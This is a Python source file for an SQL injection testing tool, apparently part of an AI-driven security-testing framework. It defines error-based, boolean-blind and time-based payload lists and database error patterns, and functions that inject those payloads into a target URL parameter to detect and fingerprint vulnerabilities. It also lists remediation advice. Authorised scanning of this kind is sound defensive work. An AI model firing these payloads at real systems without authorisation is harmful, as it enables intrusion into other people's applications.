"""SQL injection testing tool for web application security."""

from __future__ import annotations

import re
import time
from typing import Any, Literal
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

import requests

from strix.tools.registry import register_tool
from strix.tools.validation import (
    generate_usage_hint,
    validate_action_param,
    validate_required_param,
    validate_unknown_params,
)


SQLiAction = Literal["test", "detect", "fingerprint"]

# SQL injection payloads for different techniques
ERROR_BASED_PAYLOADS = [
    "'",
    "''",
    '"',
    '""',
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    '" OR "1"="1',
    "1' AND '1'='1",
    "1 AND 1=1",
    "1' AND 1=1--",
    "' UNION SELECT NULL--",
    "' UNION SELECT 1--",
    "1; SELECT 1--",
]

BLIND_BOOLEAN_PAYLOADS = [
    ("' AND '1'='1", "' AND '1'='2"),
    ("1 AND 1=1", "1 AND 1=2"),
    ("' AND 1=1--", "' AND 1=2--"),
    ("1' AND 1=1#", "1' AND 1=2#"),
]

TIME_BASED_PAYLOADS = {
    "mysql": [
        "' AND SLEEP(3)--",
        "1' AND SLEEP(3)#",
        "'; WAITFOR DELAY '0:0:3'--",
    ],
    "mssql": [
        "'; WAITFOR DELAY '0:0:3'--",
        "1; WAITFOR DELAY '0:0:3'--",
    ],
    "postgresql": [
        "'; SELECT pg_sleep(3)--",
        "1'; SELECT pg_sleep(3)--",
    ],
    "oracle": [
        "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',3)--",
    ],
}

# Database error patterns for fingerprinting
DB_ERROR_PATTERNS = {
    "mysql": [
        r"SQL syntax.*MySQL",
        r"Warning.*mysql_",
        r"MySqlException",
        r"valid MySQL result",
        r"check the manual that corresponds to your MySQL server version",
        r"MySqlClient\.",
    ],
    "postgresql": [
        r"PostgreSQL.*ERROR",
        r"Warning.*\Wpg_",
        r"valid PostgreSQL result",
        r"Npgsql\.",
        r"PG::SyntaxError",
        r"org\.postgresql\.util\.PSQLException",
    ],
    "mssql": [
        r"Driver.* SQL[\-\_\ ]*Server",
        r"OLE DB.* SQL Server",
        r"SQLServer JDBC Driver",
        r"SqlException",
        r"Unclosed quotation mark after the character string",
        r"Microsoft SQL Native Client error",
    ],
    "oracle": [
        r"ORA-[0-9]{5}",
        r"Oracle error",
        r"Oracle.*Driver",
        r"Warning.*oci_",
        r"quoted string not properly terminated",
    ],
    "sqlite": [
        r"SQLite/JDBCDriver",
        r"SQLite\.Exception",
        r"System\.Data\.SQLite\.SQLiteException",
        r"Warning.*sqlite_",
        r"sqlite3.OperationalError",
    ],
}


def _inject_payload(
    url: str,
    param: str,
    payload: str,
    method: str = "GET",
) -> requests.Response | None:
    """Inject payload into a URL parameter."""
    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)

    if param not in params:
        params[param] = [""]

    # Inject payload
    original_value = params[param][0] if params[param] else ""
    params[param] = [original_value + payload]

    new_query = urlencode(params, doseq=True)
    new_url = urlunparse(parsed._replace(query=new_query))

    try:
        if method.upper() == "GET":
            return requests.get(new_url, timeout=15)
        return requests.post(new_url, timeout=15)
    except requests.exceptions.RequestException:
        return None


def _detect_error_sqli(
    url: str,
    param: str,
    method: str = "GET",
) -> dict[str, Any]:
    """Detect error-based SQL injection."""
    results: list[dict[str, Any]] = []
    vulnerable = False
    detected_db = None

    for payload in ERROR_BASED_PAYLOADS:
        response = _inject_payload(url, param, payload, method)

        if response is None:
            continue

        # Check for database error patterns
        for db, patterns in DB_ERROR_PATTERNS.items():
            for pattern in patterns:
                if re.search(pattern, response.text, re.IGNORECASE):
                    vulnerable = True
                    detected_db = db
                    results.append({
                        "payload": payload,
                        "type": "error-based",
                        "database": db,
                        "status_code": response.status_code,
                        "pattern_matched": pattern,
                    })
                    break
            if vulnerable:
                break

        if len(results) >= 3:
            break

    return {
        "vulnerable": vulnerable,
        "technique": "error-based",
        "database": detected_db,
        "findings": results,
    }


def _detect_blind_boolean(
    url: str,
    param: str,
    method: str = "GET",
) -> dict[str, Any]:
    """Detect blind boolean-based SQL injection."""
    results: list[dict[str, Any]] = []
    vulnerable = False

    # Get baseline response
    baseline_response = _inject_payload(url, param, "", method)
    if baseline_response is None:
        return {"vulnerable": False, "error": "Could not get baseline response"}

    baseline_length = len(baseline_response.text)

    for true_payload, false_payload in BLIND_BOOLEAN_PAYLOADS:
        true_response = _inject_payload(url, param, true_payload, method)
        false_response = _inject_payload(url, param, false_payload, method)

        if true_response is None or false_response is None:
            continue

        true_length = len(true_response.text)
        false_length = len(false_response.text)

        # Check for significant difference
        if abs(true_length - false_length) > 50 and \
                abs(true_length - baseline_length) < abs(false_length - baseline_length):
            # True condition should match baseline more closely
            vulnerable = True
            results.append({
                "true_payload": true_payload,
                "false_payload": false_payload,
                "true_length": true_length,
                "false_length": false_length,
                "baseline_length": baseline_length,
                "type": "blind-boolean",
            })

        if len(results) >= 2:
            break

    return {
        "vulnerable": vulnerable,
        "technique": "blind-boolean",
        "findings": results,
    }


def _detect_time_based(
    url: str,
    param: str,
    method: str = "GET",
) -> dict[str, Any]:
    """Detect time-based blind SQL injection."""
    results: list[dict[str, Any]] = []
    vulnerable = False
    detected_db = None

    # Get baseline response time
    start = time.time()
    baseline_response = _inject_payload(url, param, "", method)
    baseline_time = time.time() - start

    if baseline_response is None:
        return {"vulnerable": False, "error": "Could not get baseline response"}

    for db, payloads in TIME_BASED_PAYLOADS.items():
        for payload in payloads:
            start = time.time()
            response = _inject_payload(url, param, payload, method)
            elapsed = time.time() - start

            if response is None:
                continue

            # Check if response was significantly delayed
            if elapsed > baseline_time + 2.5:
                vulnerable = True
                detected_db = db
                results.append({
                    "payload": payload,
                    "response_time": round(elapsed, 2),
                    "baseline_time": round(baseline_time, 2),
                    "database": db,
                    "type": "time-based",
                })

            if vulnerable:
                break
        if vulnerable:
            break

    return {
        "vulnerable": vulnerable,
        "technique": "time-based",
        "database": detected_db,
        "findings": results,
    }


def _test_sqli(
    url: str,
    param: str,
    method: str = "GET",
) -> dict[str, Any]:
    """Run comprehensive SQL injection tests."""
    results: dict[str, Any] = {
        "url": url,
        "parameter": param,
        "method": method,
        "vulnerable": False,
        "tests": {},
    }

    # Test error-based
    error_result = _detect_error_sqli(url, param, method)
    results["tests"]["error_based"] = error_result
    if error_result.get("vulnerable"):
        results["vulnerable"] = True
        results["detected_database"] = error_result.get("database")

    # Test blind boolean
    boolean_result = _detect_blind_boolean(url, param, method)
    results["tests"]["blind_boolean"] = boolean_result
    if boolean_result.get("vulnerable"):
        results["vulnerable"] = True

    # Only test time-based if not already confirmed vulnerable
    if not results["vulnerable"]:
        time_result = _detect_time_based(url, param, method)
        results["tests"]["time_based"] = time_result
        if time_result.get("vulnerable"):
            results["vulnerable"] = True
            results["detected_database"] = time_result.get("database")

    if results["vulnerable"]:
        results["recommendations"] = [
            "Use parameterized queries or prepared statements",
            "Implement input validation and sanitization",
            "Use an ORM with proper escaping",
            "Apply least privilege to database accounts",
            "Enable web application firewall rules",
        ]

    return results


def _fingerprint_database(
    url: str,
    param: str,
    method: str = "GET",
) -> dict[str, Any]:
    """Attempt to fingerprint the database type."""
    databases_detected: dict[str, int] = {}

    # Test error patterns
    for payload in ERROR_BASED_PAYLOADS[:5]:
        response = _inject_payload(url, param, payload, method)
        if response is None:
            continue

        for db, patterns in DB_ERROR_PATTERNS.items():
            for pattern in patterns:
                if re.search(pattern, response.text, re.IGNORECASE):
                    databases_detected[db] = databases_detected.get(db, 0) + 1

    # Sort by detection count
    sorted_dbs = sorted(
        databases_detected.items(),
        key=lambda x: x[1],
        reverse=True,
    )

    if sorted_dbs:
        primary_db = sorted_dbs[0][0]
        confidence = min(sorted_dbs[0][1] * 20, 100)
    else:
        primary_db = "unknown"
        confidence = 0

    return {
        "url": url,
        "parameter": param,
        "detected_database": primary_db,
        "confidence": confidence,
        "all_detections": dict(sorted_dbs),
    }


@register_tool
def sqli_tester(
    action: SQLiAction,
    url: str,
    param: str,
    method: str = "GET",

    **kwargs: Any,  # Capture unknown parameters
) -> dict[str, Any]:
    """Test for SQL injection vulnerabilities.

    This tool performs SQL injection testing including error-based,
    blind boolean-based, and time-based techniques. It also attempts
    to fingerprint the database type.

    Args:
        action: The testing action to perform:
            - test: Comprehensive SQL injection testing
            - detect: Quick detection of SQL injection
            - fingerprint: Attempt to identify database type
        url: Target URL with parameter to test
        param: Name of the parameter to test
        method: HTTP method to use (GET or POST)

    Returns:
        SQL injection test results with findings and recommendations
    """
    try:
        if action == "test":
            return _test_sqli(url, param, method)

        if action == "detect":
            error_result = _detect_error_sqli(url, param, method)
            if error_result.get("vulnerable"):
                return error_result
            return _detect_blind_boolean(url, param, method)

        if action == "fingerprint":
            return _fingerprint_database(url, param, method)

        return {"error": f"Unknown action: {action}"}

    except (ValueError, re.error) as e:
        return {"error": f"SQL injection testing failed: {e!s}"}
